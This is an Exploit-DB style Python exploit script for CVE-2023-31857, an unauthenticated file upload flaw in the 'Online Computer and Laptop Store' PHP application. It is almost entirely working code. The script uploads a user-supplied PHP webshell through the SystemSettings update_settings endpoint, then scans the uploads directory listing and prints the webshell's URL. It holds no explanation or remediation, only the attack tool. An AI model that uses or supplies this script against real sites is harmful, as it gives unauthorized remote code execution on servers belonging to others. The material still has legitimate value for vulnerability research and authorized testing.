# Exploit Title: Online Computer and Laptop Store - Unauthenticated File Upload
# Date: 5/27/2023
# Author: Alex Gan
# Vendor Homepage: https://www.sourcecodester.com/php/16397/online-computer-and-laptop-store-using-php-and-mysql-source-code-free-download.html?utm_content=cmp-true
# Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/php-ocls.zip
# Version: 1.0
# Tested on: LAMP Fedora server 38 (Thirty Eight) Apache/2.4.57 10.5.19-MariaDB PHP 8.2.6
# CVE: CVE-2023-31857
# References: https://nvd.nist.gov/vuln/detail/CVE-2023-31857
#			  https://www.exploit-db.com/exploits/51358
#	          https://github.com/Jadore147258369/php-ocls
#
#!/usr/bin/env python3
import os
import sys
import requests
import argparse
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from requests.exceptions import ConnectionError, Timeout

def get_args():
	parser = argparse.ArgumentParser()
	parser.add_argument('-u', '--url', type=str, help='URL')
	parser.add_argument('-p', '--payload', type=str, help='PHP webshell')
	return parser.parse_args()

def get_user_input(args):
	if not (args.url):
		args.url = input('Use the -u argument or Enter URL:')
	if not (args.payload):
		args.payload = input('Use the -p argument or Enter file path PHP webshell: ')
	return args.url, args.payload

def check_input_url(url):
	parsed_url = urlparse(url)
	if not parsed_url.scheme:
		url = 'http://' + url
	if parsed_url.path.endswith('/'):
		url = url.rstrip('/')
	return url

def check_host_availability(url):
    try:
        response = requests.head(url)
        if response.status_code == 200:
            print("[+] Host is accessible")
        else:
            print("[-] Host is not accessible")
            sys.exit()
    except (ConnectionError, Timeout) as e:
        print("[-] Host is not accessible")
        sys.exit()
    except requests.exceptions.RequestException as e:
        print("[-] Error:", e)
        sys.exit()

def make_request(url, method, files=None):
    if method == 'GET':
        response = requests.get(url)
    elif method == 'POST':
        response = requests.post(url, files=files)
    else:
        raise ValueError(f'Invalid HTTP method: {method}')
    
    if response.status_code == 200:
        print('[+] Request successful')
        return response.text
    else:
        print(f'[-] Error {response.status_code}: {response.text}')
        return None

def find_file(response_get, filename, find_url):
	soup = BeautifulSoup(response_get, 'html.parser')

	links = soup.find_all('a')
	found_files = []
	
	for link in links:
		file_upl = link.get('href')
		if file_upl.endswith(filename):
			print('[+] File found:', file_upl)
			file_url = find_url + file_upl
			found_files.append(file_url)

	if found_files:
		print('    Full URL of your file:')
		for file_url in found_files:
			print('[+] ' + file_url)
	else:
		print('[-] File not found')

def main():
	args = get_args()
	url, payload = get_user_input(args)
	url = check_input_url(url)
	check_host_availability(url)

	post_url = url + "/classes/SystemSettings.php?f=update_settings"
	get_url = url + "/uploads/"
	filename = os.path.basename(payload)
	payload_file = [('img',(filename,open(args.payload,'rb'),'application/octet-stream'))]
	
	print("    Loading payload file")
	make_request(post_url,  'POST', files=payload_file)
	print("    Listing the uploads directory")
	response_get = make_request(get_url, 'GET')
	print("    Finding the downloaded payload file")
	find_file(response_get, filename, get_url)

if __name__ == "__main__":
	main()
